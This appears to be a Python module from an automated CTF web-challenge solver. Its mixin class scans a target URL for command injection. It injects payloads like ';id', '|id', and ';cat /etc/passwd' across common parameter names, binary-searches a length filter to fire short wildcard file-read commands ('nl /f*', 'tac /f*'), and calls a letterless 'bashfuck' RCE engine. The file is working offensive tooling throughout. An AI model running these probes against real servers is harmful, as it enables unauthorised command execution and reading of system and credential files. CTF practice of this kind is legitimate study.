"""yang_web.core.smart_solver._web 混入 _WebRce —— 命令执行（RCE / 长度限制 RCE / Bashfuck）。"""

from __future__ import annotations
import re
import urllib.request
import urllib.error
import urllib.parse
from ._common import (_detect_php_source, _http_headers, _make_ssl_ctx, decode_body, find_flag, http_get)

class _WebRce:
    """命令执行（RCE / 长度限制 RCE / Bashfuck）。"""

    def _try_rce(self):
        """RCE 简单探测."""
        self.log("RCE", "running", "Command injection probes")
        parsed = urllib.parse.urlparse(self.url)
        path = parsed.path or "/"
        
        rce_params = ["cmd", "command", "exec", "shell", "run", "code", "ping", 
                       "ip", "host", "action", "do", "debug"]
        rce_payloads = [
            (";id", "uid="),
            ("|id", "uid="),
            ("`id`", "uid="),
            (";cat /etc/passwd", "root:"),
            (";cat /flag", None),  # any output
        ]
        
        for param in rce_params:
            for payload, expected in rce_payloads[:3]:
                test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = http_get(test_url)
                text = decode_body(body)
                f = find_flag(text)
                if f:
                    self.flag = f
                    self.log("RCE", "flag!", f"param={param}")
                    return
                if expected and expected in text:
                    self.log("RCE", "found", f"param={param} is RCE-vulnerable!")
                    # Try cat flag directly
                    flag_cmds = [";cat /flag", ";cat /flag.txt", ";cat /home/*/flag",
                                  "|cat /flag", "|cat /flag.txt"]
                    for fcmd in flag_cmds[:3]:
                        ftest = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(fcmd)}"
                        code, body, _ = http_get(ftest)
                        ff = find_flag(decode_body(body))
                        if ff:
                            self.flag = ff
                            self.log("RCE", "flag!", f"cmd={fcmd}")
                            return
                    return
        
        self.log("RCE", "none", "No RCE found")
    
    def _try_length_limit_rce(self):
        """长度限制 RCE 检测 (v3.5 新增).
        
        检测模式:
            1. PHP 参数名为数字 (如 $_GET[1]) — 字母参数名被 WAF 拦截
            2. strlen() < N 字符限制 (如 < 8 即 max 7 chars)
            3. shell_exec() / system() 直接执行
        
        利用: 生成 ≤maxlen 的短命令 (nl/f*, tac/f*, od/f* 等)
        """
        self.log("LenRCE", "running", "Probing numeric params + length limit")
        
        parsed = urllib.parse.urlparse(self.url)
        path = parsed.path or "/"
        base = f"{parsed.scheme}://{parsed.netloc}{path}"
        
        # ── Step 1: Probe numeric parameter names ──
        # 尝试 0-9 作为参数名，检测是否有 PHP 源码返回
        for pnum in range(10):
            pname = str(pnum)
            test_url = f"{base}?{pname}=1"
            code, body, _ = http_get(test_url, timeout=5)
            if not body:
                continue
            text = decode_body(body)
            
            # 检测是否有 PHP 源码（含高亮）或 shell 输出
            has_php = _detect_php_source(text)
            has_output = (len(text) > 20 and 'too long' not in text.lower()
                         and '<?php' not in text and '&lt;?php' not in text)
            
            if not has_php and not has_output:
                continue
            
            self.log("LenRCE", "param_found", f"param={pname}")
            
            # ── Step 2: Determine max command length ──
            max_len = self._find_max_cmd_len(base, pname)
            if max_len is None or max_len < 2:
                self.log("LenRCE", "no_limit", "No length limit detected or too short")
                # Fall back: try standard short payloads anyway
                max_len = 20
            
            self.log("LenRCE", "limit", f"max cmd length = {max_len}")
            
            # ── Step 3: Execute short payloads ──
            # 按优先级排序的短 payload 库
            short_payloads = [
                # Flag-read commands first (likely to produce flag directly)
                (6, 'nl /f*'),
                (7, 'tac /f*'),
                (6, 'od /f*'),
                (7, 'nl /*f*'),
                (7, 'od /*f*'),
                (7, 'rev /f*'),
                # Recon (to locate flag path)
                (4, 'ls /'),
                (2, 'ls'),
                (2, 'id'),
                # Fallback: other flag paths
                (6, 'nl /h*'),
                (6, 'nl /r*'),
                (6, 'nl /t*'),
                (5, 'nl *'),
                (6, 'tac *'),
                (5, 'rev *'),
                (4, 'od *'),
            ]
            
            tried = set()
            for pay_len, cmd in short_payloads:
                if pay_len > max_len or cmd in tried:
                    continue
                if pay_len > max_len or cmd in tried:
                    continue
                tried.add(cmd)
                
                test_url = f"{base}?{pname}={urllib.parse.quote(cmd)}"
                try:
                    code, body, _ = http_get(test_url, timeout=8)
                    text = decode_body(body)
                    
                    # Extract command output before PHP source (avoid false flag matches in source)
                    clean = re.sub(r'<[^>]+>', '', text)
                    clean = clean.replace('&lt;', '<').replace('&gt;', '>').replace('&nbsp;', ' ').replace('&amp;', '&').replace('<br />', '\n')
                    lines = clean.split('\n')
                    out_lines = []
                    in_source = False
                    for l in lines:
                        if '<?php' in l or 'function ' in l or 'preg_match' in l or 'highlight_file' in l:
                            in_source = True
                            break
                        stripped = l.strip()
                        if stripped and not in_source:
                            out_lines.append(stripped)
                    output_text = '\n'.join(out_lines)
                    
                    # Search flag in output first, then raw (fallback)
                    search = output_text if output_text else text
                    f = find_flag(search)
                    if f:
                        self.flag = f
                        self.log("LenRCE", "flag!", f"param={pname} cmd={cmd}")
                        return
                    
                    # Log command output for debugging
                    if out_lines and not any(kw in out_lines[0].lower() for kw in ['too long', 'waf']):
                        output = ' '.join(out_lines[:3])[:120]
                        self.log("LenRCE", "output", f"cmd={cmd}: {output}")
                except Exception:
                    continue
            
            # Found a working parameter, no need to try more
            break
        else:
            self.log("LenRCE", "none", "No numeric-param RCE found")
    
    def _find_max_cmd_len(self, base: str, param: str) -> int:
        """二分查找确定最大命令长度限制.
        
        注意: 不能用 'too long' 简单匹配，因为 PHP 源码本身包含 exit('too long')。
        正确逻辑: 有 PHP 源码返回 = 命令通过；纯 'too long' 文本 = 长度超限。
        """
        def _cmd_passes(length: int) -> bool:
            """发送指定长度的命令，返回 True 表示通过长度检查"""
            url_m = base + '?' + param + '=' + ('A' * length)
            code, body, _ = http_get(url_m, timeout=5)
            text = decode_body(body)
            # 有 PHP 源码 = 命令通过（即使源码含 'too long' 字样）
            return _detect_php_source(text)
        
        # 快速探测
        if _cmd_passes(20):
            return 20  # 无长度限制
        if _cmd_passes(7):
            # 7 通过，20 不通过 → 二分搜索 7..20
            lo, hi = 7, 20
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if _cmd_passes(mid):
                    lo = mid
                else:
                    hi = mid - 1
            return lo
        else:
            # 7 也不通过 → 二分搜索 1..7
            lo, hi = 1, 7
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if _cmd_passes(mid):
                    lo = mid
                else:
                    hi = mid - 1
            return lo
    
    def _try_bashfuck_rce(self):
        """bashFuck 无字母命令执行 — 委托给 bashfuck_solver 通用引擎.
        
        bashfuck_solver.py 覆盖:
            - PHP system/exec/passthru + WAF 过滤
            - GET/POST 自动探测 + 三级编码策略(bit/zero/c)
            - 函数链追踪 (function f($p){system($p)} → $_POST)
        """
        self.log("bashFuck", "running", "bashfuck_solver v1.0")
        from yang_web.core.bashfuck_solver import auto_solve as bf_auto_solve

        def _progress(stage, item, status):
            self.log(stage, item, status)

        result = bf_auto_solve(self.url, on_progress=_progress)
        if result:
            self.flag = result.get('flag')
            if self.flag:
                self.log("bashFuck", "flag!",
                         f"form={result.get('form')}, param={result.get('param')}: {self.flag}")
            else:
                self.log("bashFuck", "none", result.get('status', 'No flag found'))
